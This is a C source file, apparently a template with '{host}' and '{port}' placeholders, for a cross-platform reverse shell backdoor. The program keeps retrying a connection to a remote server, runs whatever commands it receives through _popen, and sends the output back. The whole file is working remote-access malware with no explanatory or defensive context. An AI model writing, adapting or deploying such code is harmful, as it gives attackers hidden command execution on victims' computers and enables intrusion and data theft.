#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifdef _WIN32
#include <winsock2.h>
#include <ws2tcpip.h>
#pragma comment(lib, "ws2_32.lib")
#else
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#endif

void create_socket(SOCKET *client_socket) {
#ifdef _WIN32
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        perror("Error initializing Winsock");
        exit(EXIT_FAILURE);
    }
#endif

    *client_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (*client_socket == INVALID_SOCKET) {
        perror("Error creating socket");
        exit(EXIT_FAILURE);
    }
}

void connect_socket(SOCKET *client_socket, const char *host, int port) {
    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    server_addr.sin_addr.s_addr = inet_addr(host);

    while (1) {
        if (connect(*client_socket, (struct sockaddr *)&server_addr, sizeof(server_addr)) == 0) {
            break;
        }
#ifdef _WIN32
        Sleep(5000);
#else
        sleep(5);
#endif
    }
}

void communicate_w_server(SOCKET client_socket) {
    char buffer[1024];
    int bytes_received;
    while (1) {
        bytes_received = recv(client_socket, buffer, sizeof(buffer), 0);
        if (bytes_received == SOCKET_ERROR) {
            perror("Error receiving data from server");
            exit(EXIT_FAILURE);
        } else if (bytes_received == 0) {
            // Connection closed by server, attempt to reconnect
            connect_socket(&client_socket, "{host}", {port});
        } else {
            buffer[bytes_received] = '\0';
            if (strncmp(buffer, "cd", 2) == 0) {
                chdir(buffer + 3);
            } else if (strlen(buffer) > 0) {
                FILE *fp = _popen(buffer, "r");
                if (fp == NULL) {
                    perror("Error executing command");
                    exit(EXIT_FAILURE);
                }
                char command_output[4096];
                size_t total_bytes = 0;
                while (!feof(fp)) {
                    size_t bytes_read = fread(command_output + total_bytes, 1, sizeof(command_output) - total_bytes, fp);
                    if (bytes_read == 0 && ferror(fp)) {
                        perror("Error reading command output");
                        exit(EXIT_FAILURE);
                    }
                    total_bytes += bytes_read;
                }
                _pclose(fp);
                send(client_socket, command_output, total_bytes, 0);
            }
        }
    }
}

int main() {
#ifdef _WIN32
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        perror("Error initializing Winsock");
        exit(EXIT_FAILURE);
    }
#endif

    SOCKET client_socket;
    create_socket(&client_socket);
    connect_socket(&client_socket, "{host}", {port});
    communicate_w_server(client_socket);

#ifdef _WIN32
    WSACleanup();
#endif

    return 0;
}
